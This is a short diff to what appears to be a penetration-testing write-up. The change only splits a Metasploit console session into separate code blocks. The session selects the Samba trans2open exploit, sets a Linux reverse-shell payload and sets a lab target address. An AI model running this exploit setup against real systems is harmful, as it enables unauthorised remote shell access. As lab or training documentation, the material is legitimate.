@@ -348,10 +348,25 @@ Interact with a module by name or index. For example info 3, use 3 or use exploi
 
 ```
 msf6 > use 1
+```
+
+```
 [*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+```
+
+```
 msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
+```
+
+```
 payload => linux/x86/shell_reverse_tcp
+```
+
+```
 msf6 exploit(linux/samba/trans2open) > set rhosts 172.10.0.222
+```
+
+```
 rhosts => 172.10.0.222
 ```
 
